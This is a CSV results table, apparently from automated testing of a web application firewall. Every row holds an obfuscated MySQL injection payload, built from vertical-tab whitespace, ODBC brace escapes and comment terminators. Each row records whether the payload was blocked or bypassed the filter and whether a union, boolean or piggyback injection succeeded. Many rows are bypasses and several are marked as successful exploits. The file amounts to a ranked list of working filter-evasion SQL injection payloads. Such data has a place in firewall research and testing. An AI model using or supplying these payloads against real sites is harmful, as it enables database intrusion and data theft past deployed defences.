Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@=1%0bor%0b!+{x%0b(select%0b1)}=1=%0b(not+1)+||',Bypassed,No,None,Unknown,0.0104,70.19,No,500
0%27<@!=1%0bor+!+{`if`%0b1}=1=+(!%0b{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0176,70.19,No,500
0%27<@!=.1%0b||+!+{`if`%0b1}=1=%0b(not+{a%0b1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0183,70.19,No,200
0%27<@!=.1%0b||%0b!%0b{x%0b(select%0b1)}=1=%0b(!%0b{a%0b1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0118,70.19,No,200
0'<@!=1%0b||+!+{x%0b(select+1)}=1=%0b(!%0b{a+1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0128,70.19,No,500
0%27||%0b@<@.+||%0b!+{x%0b(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1)+or,Bypassed,Yes,unionAtk,Unknown,0.0179,70.19,No,200
0%27<@=1.%0b||+not+{a+1}=1=%0b(not+{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.014,70.19,No,500
0%27<@!=1.+||+not+{x+(select%0b1)}=1=%0b(not%0btrue)+||',Blocked,No,None,Unknown,0.0089,70.19,No,403
0'<@=1+or%0bnot%0b{a+1}=1=+(not+{`if`+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0099,70.19,No,500
0%27<@=.1%0bor%0bnot%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0143,70.19,No,200
0%27<@=.1%0bor%0bnot+{x%0b(select+1)}=1=%0b(!~0)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0127,70.19,No,200
0%27or%0b!@<@.%0bor+!%0b{x+(select%0b1)}=1=+(!+{x+(select+1)}=1)%0bor,Bypassed,Yes,unionAtk,Unknown,0.0076,70.19,No,200
0%27<@!=.1%0bor+!+{x+(select+1)}=1=+(not%0b{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0116,70.19,No,500
0'<@!=.1+or%0b!%0b{x%0b(select+1)}=1=%0b(!%0b{x+(select%0b1)}=1)--%0b,Blocked,No,None,piggyAtk,0.0091,70.19,No,403
0'<@!=1.+or+!+{x%0b(select+1)}=1=%0b(!%0b{x+(select%0b1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0161,69.55,No,500
0%27<@!=1+or+not%0b{a%0b1}=1=+(not%0b{x+(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0109,69.94,No,500
0%27<@=.1%0bor%0bnot~0=+(false)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0145,69.94,No,200
0'<@=1.+||+{a+1}=1%0blike+{`if`%0b1}=1%0b||',Bypassed,No,None,Unknown,0.013,69.94,No,500
0%27<@!=1.+or+!+{x%0b(select%0b1)}=1=+(!+{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.0118,69.94,No,500
0'<@!=1.+||+not+1=%0b(!+{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0187,69.94,No,500
0%27<@!=1+||+not+{a%0b1}=1=%0b(!+{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0116,69.94,No,500
0'<@!=1+or+not+{`if`%0b1}=1=+(!+{`if`%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0178,69.94,No,500
0'<@!=.1+or%0bnot+{a+1}=1=%0b(not%0b{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0078,69.94,No,500
0'or%0b@<@.+or+{x+(select+1)}=1%0blike%0b{x%0b(select+1)}=1%0b||%27,Bypassed,No,None,Unknown,0.0065,69.94,No,500
0'<@=.1+or+not%7efalse=+(!%0b{a+1}=1)%0b||%27,Bypassed,No,None,booleanAtk,0.0164,69.94,No,500
0'<@=.1%0b||+!+{x+(select+1)}=1=%0b(!+{x%0b(select+1)}=1)--+,Bypassed,No,None,piggyAtk,0.0124,69.94,No,500
0%27<@=1.%0bor%0b!%0b{x%0b(select%0b1)}=1=+(!%0btrue)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0221,69.94,No,200
0%27<@!=1.%0bor%0bnot+{x%0b(select%0b1)}=1=+(not+1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0139,69.94,No,200
0%27<@!=1.%0bor%0bnot%0b{x%0b(select+1)}=1=+(not%0b{x%0b(select%0b1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0165,69.94,No,200
0'<@!=1+or%0bnot~false=+(!%0b{x+(select%0b1)}=1)+||%27,Bypassed,No,None,booleanAtk,0.0154,70.07,No,500
0'||+@<@%0b||+{`if`+1}=1+like+{x%0b(select+1)}=1%0b||',Bypassed,No,None,Unknown,0.0118,70.19,No,500
0%27<@=.1+||+!%0btrue=+(not~0)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0138,70.19,No,200
0%27<@=.1+or+!%0b{x+(select+1)}=1=+(not+{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0069,70.19,No,500
0%27<@=1+||+not%0b{a+1}=1=%0b(!%0b{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0147,70.19,No,500
0%27<@=1.+||%0b!+{x%0b(select%0b1)}=1=+(!+true)+||',Bypassed,No,None,Unknown,0.0161,70.19,No,500
0'<@=1.+or%0b!%0b{x%0b(select+1)}=1=%0b(not+{a%0b1}=1)%23,Blocked,No,None,piggyAtk,0.0095,70.19,No,403
0'<@!=.1+or%0b!%0b{x+(select%0b1)}=1=%0b(!+{x+(select+1)}=1)+or',Blocked,No,None,Unknown,0.0255,70.19,No,403
0%27<@=1.+or+not+{x+(select%0b1)}=1=+(false)+or%27,Blocked,No,None,booleanAtk,0.0047,70.19,No,403
0'<@!=.1+||%0bnot+1=+(not+{x+(select+1)}=1)--+,Blocked,No,None,piggyAtk,0.0109,70.19,No,403
0'or+@<@.+or%0b1+like+{x%0b(select+1)}=1%0bor%27,Bypassed,No,None,Unknown,0.0133,70.19,No,500
0%27<@!=1+||%0bnot+{x+(select%0b1)}=1=%0b(not%0b{`if`+1}=1)--+,Blocked,No,None,piggyAtk,0.0125,70.19,No,403
0%27<@=1.+or%0bnot%0b{`if`%0b1}=1=%0b(not+{a+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0138,70.19,No,200
0%27<@!=1+or+!+true=+(not+{x%0b(select%0b1)}=1)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0099,70.19,No,200
0'<@=.1+||%0bnot%0b{`if`%0b1}=1=+(!%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0126,70.19,No,500
0'<@!=1.%0bor+not%0b{x%0b(select%0b1)}=1=%0b(not+{x%0b(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0134,70.19,No,500
0'<@!=1.%0b||+!%0b{a%0b1}=1=%0b(!+{`if`%0b1}=1)%0bor',Bypassed,No,None,Unknown,0.0112,70.19,No,500
0%27<@!=1.+or+0+is+false+||',Bypassed,No,None,booleanAtk,0.0114,70.19,No,500
0'<@!=1%0b||%0bnot%7e0=+(not+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0161,70.19,No,500
0%27<@!=1%0bor+not%0b{x%0b(select+1)}=1=+(false)+or',Bypassed,No,None,booleanAtk,0.0135,70.19,No,500
0%27<@=.1%0b||%0bnot%0btrue=+(not+{x%0b(select%0b1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0151,70.19,No,200
0'<@=.1+||%0b{x%0b(select%0b1)}=1+like%0b{`if`+1}=1--+,Bypassed,No,None,piggyAtk,0.0119,70.19,No,500
0'<@!=.1+||%0b!%0b1=+(!%0btrue)+||%27,Bypassed,No,None,Unknown,0.0087,70.19,No,500
0'<@=1.%0b||+!+{a+1}=1=+(!+{a%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0139,70.19,No,500
0%27<@!=.1+or%0bnot%0b{x+(select%0b1)}=1=+(!%0b{x%0b(select+1)}=1)%0bor%27,Blocked,No,None,Unknown,0.009,70.19,No,403
0'<@!=.1%0b||%0b!+{`if`+1}=1=%0b(not%0b{x%0b(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0195,70.19,No,500
0%27<@=.1+or%0b!~0=%0b(!%0b{x+(select%0b1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0176,70.19,No,200
0'<@=.1%0bor+not%0b{x+(select%0b1)}=1=+(not+{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0127,70.19,No,500
0'<@!=1+||%0bnot%0b1=%0b(!+{`if`%0b1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0133,70.19,No,500
0'<@!=1+or+0=+(not%0b{x+(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0256,70.19,No,500
0%27<@!=1.%0bor+not%0b{`if`%0b1}=1=%0b(not%7efalse)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0184,70.19,No,200
0%27<@=1.+||+!+{`if`%0b1}=1=%0b(not%0btrue)%0bor',Bypassed,No,None,booleanAtk,0.0143,70.19,No,500
0'<@!=.1+or+{a+1}=1%0blike%0b{x%0b(select%0b1)}=1+or',Bypassed,No,None,Unknown,0.0106,70.19,No,500
0%27<@=1%0bor+!+{a%0b1}=1=%0b(not+{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.0131,70.19,No,500
0'<@=.1%0bor+!%0b{x%0b(select+1)}=1=%0b(not%0b{x+(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0195,70.19,No,500
0'<@!=1.+||+not+{a+1}=1=%0b(not+true)--%0b,Bypassed,No,None,piggyAtk,0.0138,69.94,No,500
0%27<@!=1+||%0b!+{x+(select+1)}=1=+(not+{x+(select+1)}=1)+or%27,Blocked,No,None,Unknown,0.0161,69.94,No,403
0'<@=1.%0bor%0bnot%0b{x+(select+1)}=1=+(not+{a%0b1}=1)+or',Bypassed,No,None,Unknown,0.0107,69.94,No,500
7'%0bor%0b{x+(select%0b1)}=1%0blike%0b{x+(select+1)}=1+or%270,Blocked,No,None,Unknown,0.0107,69.94,No,403
0%27<@=1.+||+not+{`if`+1}=1=%0b(not+{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0115,69.94,No,500
0%27<@=1%0b||+not+{x+(select+1)}=1=%0b(!+1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0165,69.94,No,200
0'<@!=1+||%0bnot+{x+(select%0b1)}=1=%0b(!%7e0)+||',Blocked,No,None,Unknown,0.0154,69.94,No,403
0%27<@=.1%0bor%0bnot+{x+(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0135,69.94,No,200
0%27<@=.1%0b||%0bnot%0b{x%0b(select+1)}=1=+(not+{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0146,69.94,No,500
0'<@!=1%0b||%0bnot%0b{x+(select+1)}=1=+(not%0b{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0137,69.94,No,500
0'<@!=1.%0bor+not+{x%0b(select+1)}=1=%0b(not+{a%0b1}=1)%0bor',Bypassed,No,None,Unknown,0.0193,69.94,No,500
0'<@!=1.+or%0b!+{x+(select%0b1)}=1=+(not%0btrue)--%0b,Blocked,No,None,piggyAtk,0.0093,69.94,No,403
0'<@!=.1+or%0b!+{x%0b(select+1)}=1=+(!%0b{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0096,69.94,No,500
0'<@=1.+or%0bnot%7e0=%0b(!+true)+||',Bypassed,No,None,booleanAtk,0.0175,70.07,No,500
0'<@!=1%0bor+not+{a+1}=1=+(!%0b{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0117,70.19,No,500
0'||+!@<@.%0bor+not%0b{a+1}=1=+(!%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0112,70.19,No,500
0'<@!=.1+||+!~false=+(!~false)+or%27,Blocked,No,None,booleanAtk,0.0118,70.19,No,403
0%27<@=1.+||%0b!%7efalse=%0b(!+{x+(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0169,70.19,No,500
0%27<@=.1%0bor%0b!%0b{a+1}=1=+(not+true)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.025,70.19,No,200
0'<@=1.+or%0b!+{a+1}=1=+(not%0b{x%0b(select+1)}=1)--+,Bypassed,No,None,piggyAtk,0.0111,70.19,No,500
0%27or%0b1<@.%0b||%0b!+1=%0b(not+{x+(select+1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0112,70.19,No,200
0'or%0b@<@.+||%0b1+like+{x+(select+1)}=1+or%27,Bypassed,No,None,Unknown,0.0234,70.19,No,500
0%27<@!=.1%0bor%0b!+{x+(select+1)}=1=+(not%0b{x+(select%0b1)}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0113,70.19,No,200
0'<@=1.%0b||+not%0b{x+(select%0b1)}=1%0bis%0bfalse%23,Bypassed,No,None,piggyAtk,0.022,70.19,No,500
0'<@=1.+||%0bnot+{x+(select+1)}=1=%0b(0)+||%27,Blocked,No,None,Unknown,0.0144,70.19,No,403
0'<@=1+||+{x+(select%0b1)}=1%0blike+{`if`%0b1}=1+||',Blocked,No,None,Unknown,0.0068,70.19,No,403
0%27<@!=1%0b||+!%0btrue=%0b(not%0b{`if`%0b1}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.015,70.19,No,200
0%27<@!=1+or%0b{a+1}=1+like%0b{x%0b(select+1)}=1%23,Bypassed,Yes,unionAtk,piggyAtk,0.0279,70.19,No,200
0'<@=.1+or%0bnot%0b{`if`%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0164,70.19,No,500
0'<@!=1.%0b||%0b!%7efalse=%0b(not+{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,booleanAtk,0.0151,70.19,No,500
0'<@=1+or%0b!%0btrue=%0b(!+{`if`%0b1}=1)+or',Blocked,No,None,booleanAtk,0.0104,70.19,No,403
0'<@!=1.%0b||+!%7e0=%0b(not%0b{a+1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0183,70.19,No,500
0%27<@!=1.+||+!+{`if`%0b1}=1=+(!%7e0)+||%27,Bypassed,Yes,unionAtk,Unknown,0.008,70.19,No,200
0'<@=1%0bor+!+{x+(select+1)}=1=+(!+{a%0b1}=1)+||%27,Bypassed,No,None,Unknown,0.0121,70.19,No,500
0%27<@=1%0b||+not+true=%0b(!+{`if`%0b1}=1)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0161,70.19,No,200
0%27<@=1+or+not+{a+1}=1=+(!%0b{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0182,70.19,No,500
0'<@!=1.%0bor%0b!%7efalse=+(not+{x%0b(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.0146,70.19,No,500
0'<@!=.1+or%0bnot~false=%0b(not%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,booleanAtk,0.0202,70.19,No,500
0'<@!=.1+||+!+true=+(not%0b{x+(select+1)}=1)+or%27,Bypassed,No,None,booleanAtk,0.0109,70.19,No,500
0'<@!=1.+or%0b!%0b{x%0b(select+1)}=1=+(not+1)+||',Blocked,No,None,Unknown,0.0112,70.19,No,403
0'<@!=1.+||+{x+(select+1)}=1%0blike+{x+(select+1)}=1%0bor',Blocked,No,None,Unknown,0.0086,70.19,No,403
0'<@=1+||+not+{a+1}=1=%0b(!%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0137,70.19,No,500
0%27<@=.1%0b||+not+{x+(select%0b1)}=1=+(!%0b{a+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0229,70.19,No,200
0%27<@!=1.+||%0bnot+{x+(select%0b1)}=1=%0b(!+{a%0b1}=1)%0bor%27,Blocked,No,None,Unknown,0.0138,70.19,No,403
0%27<@=.1%0bor%0b!+1=+(not+{x%0b(select+1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0115,70.19,No,200
0'<@!=.1%0b||%0bnot%7e0=+(not+{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0133,70.19,No,500
0%27<@=.1+||+not+{x+(select+1)}=1=%0b(!+{`if`%0b1}=1)--+,Blocked,No,None,piggyAtk,0.0152,70.19,No,403
0'<@!=1.%0bor%0bnot+{a+1}=1=+(not%0b{`if`+1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0229,70.19,No,500
0'<@=1.%0bor+not+true=+(not~0)%23,Bypassed,No,None,piggyAtk,0.0203,70.19,No,500
0'<@!=1+or%0b!~0=%0b(not~false)%0bor',Bypassed,No,None,booleanAtk,0.0127,70.19,No,500
0'<@=1%0bor+!+{`if`%0b1}=1=+(not+true)%0b||',Bypassed,No,None,booleanAtk,0.015,69.67,No,500
0%27<@=1+or+!+{x%0b(select+1)}=1=+(not~false)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0135,69.94,No,200
0'<@!=1+or+not%0b{x+(select+1)}=1=%0b(!+true)%0bor%27,Bypassed,No,None,booleanAtk,0.0213,69.94,No,500
0'<@!=.1+or%0b!%0btrue=%0b(!%0b{`if`%0b1}=1)+||%27,Blocked,No,None,booleanAtk,0.0045,69.94,No,403
0'<@!=1+||%0b!%0b1=+(!+{`if`+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0116,69.94,No,500
0%27<@!=1%0b||+not%0b{x+(select+1)}=1=%0b(!%0b{`if`%0b1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0207,69.94,No,200
0'<@!=1%0b||+not~false=%0b(!%7efalse)%23,Bypassed,No,None,piggyAtk,0.0093,69.94,No,500
0'<@!=.1+||%0b!+{x+(select+1)}=1+is%0bfalse%0b||%27,Blocked,No,None,Unknown,0.0054,69.94,No,403
0'<@=1.+||%0bnot%7e0=%0b(not+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0164,69.94,No,500
0'<@=.1%0b||+not+{a+1}=1=%0b(not%0b1)+or',Bypassed,No,None,Unknown,0.0136,69.94,No,500
0'<@!=.1%0b||+not+{x+(select%0b1)}=1=+(not%0btrue)%0b||',Bypassed,No,None,Unknown,0.0135,69.94,No,500
0%27<@=.1%0b||+{x+(select+1)}=1+like+{`if`+1}=1+or%27,Bypassed,Yes,unionAtk,Unknown,0.0183,69.94,No,200
0'<@!=1.+||+!%0b{a+1}=1=+(!+{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0149,69.94,No,500
0'<@!=1%0bor%0bnot%0b1=+(!%0b{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0165,69.94,No,500
0'<@=1.+or+!%0b{x%0b(select%0b1)}=1=+(not+{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0112,70.19,No,500
0%27<@=1+or+!%0b1=+(not%7efalse)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0108,70.19,No,200
0'<@!=1.+or+not+{x+(select%0b1)}=1=+(not+{a+1}=1)%0bor',Blocked,No,None,Unknown,0.0062,70.19,No,403
0'<@!=.1+||%0bnot+1=%0b(not+{`if`%0b1}=1)%0bor',Bypassed,No,None,Unknown,0.0055,70.19,No,500
0%27<@!=1%0b||+not%7e0=+(not%0btrue)+or',Bypassed,No,None,booleanAtk,0.0162,70.19,No,500
0'<@=.1%0bor%0b!%0b{a+1}=1=+(not%0b{a+1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0088,70.19,No,500
0'<@!=1+||+{a%0b1}=1%0blike%0b{`if`+1}=1+or%27,Bypassed,No,None,Unknown,0.021,70.19,No,500
0%27<@=1+or+not+{x+(select%0b1)}=1=+(not+{x+(select+1)}=1)%0bor%27,Blocked,No,None,Unknown,0.0073,70.19,No,403
0%27<@=1%0bor+not%7efalse=%0b(not%0b{`if`%0b1}=1)+or',Bypassed,No,None,booleanAtk,0.0114,70.19,No,500
0%27<@=1%0bor+not%0b{`if`+1}=1=%0b(!+{x+(select+1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0164,70.19,No,200
0%27<@=1%0bor%0b!+{x%0b(select%0b1)}=1=%0b(not%0btrue)+||',Bypassed,No,None,booleanAtk,0.0174,70.19,No,500
0%27or%0b@<@.%0b||+not+{`if`%0b1}=1=%0b(not+{`if`+1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0223,70.19,No,200
0%27<@=1%0b||+not%0b{`if`%0b1}=1=%0b(!+{x+(select+1)}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.014,70.19,No,200
0%27<@!=1%0bor%0bnot%7efalse=+(!+true)%0b||',Bypassed,No,None,booleanAtk,0.0134,70.19,No,500
0%27<@=1.+||+not+true=+(!~false)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0186,70.19,No,200
0'<@=.1%0bor+not%0b{x+(select+1)}=1=%0b(!+{a+1}=1)--+,Bypassed,No,None,piggyAtk,0.0131,70.19,No,500
0%27<@=1.+or%0bnot+1=+(!+{x%0b(select%0b1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0111,70.19,No,200
0%27<@=.1%0b||%0bnot+{x+(select+1)}=1=+(!+true)%0bor',Bypassed,No,None,booleanAtk,0.0207,70.19,No,500
0'<@=1+||+!+1=+(false)+||',Blocked,No,None,Unknown,0.0133,70.19,No,403
0%27<@!=.1%0bor%0bnot%0b1=+(!%0b{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0147,70.19,No,500
0%27<@!=1+or%0b!+{x%0b(select+1)}=1=+(0)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0087,70.19,No,200
0%27<@=.1%0b||+!%0btrue=%0b(not+{x+(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0117,70.19,No,200
0%27<@!=1.%0bor%0bnot+{`if`+1}=1=%0b(not+{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.011,70.19,No,500
0'<@!=.1%0bor+!%0b{x+(select%0b1)}=1=%0b(not%7e0)%0bor%27,Bypassed,No,None,Unknown,0.0219,70.19,No,500
0'<@=1.+or+not~0=+(!%7e0)+or%27,Bypassed,No,None,Unknown,0.0108,70.19,No,500
0%27<@=1.+or+!~false=%0b(!+{a+1}=1)%0b||',Bypassed,No,None,booleanAtk,0.0084,70.19,No,500
0%27<@!=1.+||%0b!%0b{a+1}=1%0bis+false+||',Bypassed,No,None,Unknown,0.0111,70.19,No,500
0'<@!=1%0bor%0bnot+{a+1}=1=+(!+{a+1}=1)--+,Bypassed,No,None,piggyAtk,0.0182,70.19,No,500
0'or+1<@.+or%0bnot%0b{a+1}=1=%0b(false)%0bor',Bypassed,No,None,booleanAtk,0.0135,70.19,No,500
0'<@=.1+or+not+{`if`%0b1}=1=+(!+{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0136,70.19,No,500
0%27<@=1.+or+not%0b{`if`%0b1}=1=%0b(!%0b{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0199,70.19,No,500
0'<@!=1.+||%0bnot+{`if`%0b1}=1=+(!%0b{x+(select%0b1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0082,70.19,No,500
0'<@!=.1%0b||+not+{x%0b(select+1)}=1=%0b(!%0b{`if`+1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0081,70.19,No,500
0'<@!=1+||+!+{`if`%0b1}=1=+(not%0b{x+(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0089,70.19,No,500
0'<@=1.+||+false=+(not+{a%0b1}=1)+or%27,Bypassed,No,None,booleanAtk,0.0132,70.19,No,500
0%27<@!=1+||+!%0b{x%0b(select+1)}=1=%0b(not%0b{a+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0152,70.19,No,200
0'<@=.1+||%0bnot%0b1=+(not+{a%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0138,69.94,No,500
0%27<@!=.1+||%0b!+{`if`%0b1}=1=%0b(!+{`if`%0b1}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0174,69.94,No,200
0'<@!=1.+||+not%7e0=+(not%0b{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0072,69.94,No,500
0%27<@=1.+||+!+{`if`+1}=1=%0b(not+true)+||',Bypassed,No,None,Unknown,0.0123,69.94,No,500
0%27<@=1.%0bor+!+{a%0b1}=1=+(not+true)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0056,69.94,No,200
0%27<@=.1+or%0bnot~false=%0b(false)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0164,69.94,No,200
0'<@=1.+or+not+{`if`%0b1}=1=+(!~false)+or%27,Bypassed,No,None,booleanAtk,0.0198,69.94,No,500
0%27<@=.1+||+false=%0b(!%0b1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0155,69.94,No,200
0'<@=1+or+!+{`if`+1}=1=+(not+true)%0b||',Bypassed,No,None,booleanAtk,0.0165,69.94,No,500
0'<@=1%0b||+!%0b{a%0b1}=1=+(!+{a%0b1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0111,69.94,No,500
0%27<@!=1%0bor+not%0b{a+1}=1=+(!+1)+||',Bypassed,No,None,Unknown,0.02,69.94,No,500
0%27<@=1+||+!%0b{x%0b(select+1)}=1=%0b(!+{a%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0124,69.94,No,500
0%27<@!=1+or%0bfalse=+(not+{a+1}=1)+||',Bypassed,No,None,booleanAtk,0.0192,69.94,No,500
0'<@!=.1%0bor+!%7efalse=%0b(not+true)+or%27,Bypassed,No,None,booleanAtk,0.0127,70.07,No,500
0'<@=1.+||+not%0btrue=+(not%7e0)+or%27,Bypassed,No,None,booleanAtk,0.0148,70.19,No,500
0%27<@!=1.+or+not%0b{x+(select+1)}=1=%0b(not+{`if`+1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0089,70.19,No,200
0%27<@=1.%0bor%0b!+{x+(select%0b1)}=1=+(not%0b{a%0b1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0108,70.19,No,200
0'||+!@<@.+||+{a%0b1}=1+like%0b{`if`%0b1}=1+or',Bypassed,No,None,Unknown,0.0119,70.19,No,500
0%27<@!=1+or%0b!+{x+(select%0b1)}=1=+(not+{`if`%0b1}=1)+or%27,Blocked,No,None,Unknown,0.0048,70.19,No,403
0'<@=.1%0b||%0b!%0b{x+(select%0b1)}=1=+(!%0b{x+(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0147,70.19,No,500
0'<@!=1.%0bor%0b!+{a+1}=1=%0b(not+{x+(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0171,70.19,No,500
0%27<@=.1+or+not+{x%0b(select+1)}=1=%0b(!~false)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0137,70.19,No,200
0'||+@<@+or%0btrue%0blike%0b{x%0b(select%0b1)}=1+or',Bypassed,No,None,booleanAtk,0.0185,70.19,No,500
0%27<@=1%0bor+{x%0b(select+1)}=1%0blike%0b{x+(select+1)}=1+or',Bypassed,No,None,Unknown,0.0103,70.19,No,500
0'<@=1.%0bor%0bnot%7efalse=+(not%0btrue)+||%27,Bypassed,No,None,booleanAtk,0.0108,70.19,No,500
0'<@!=1.%0bor+not+{`if`+1}=1=+(not%0b{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.0176,70.19,No,500
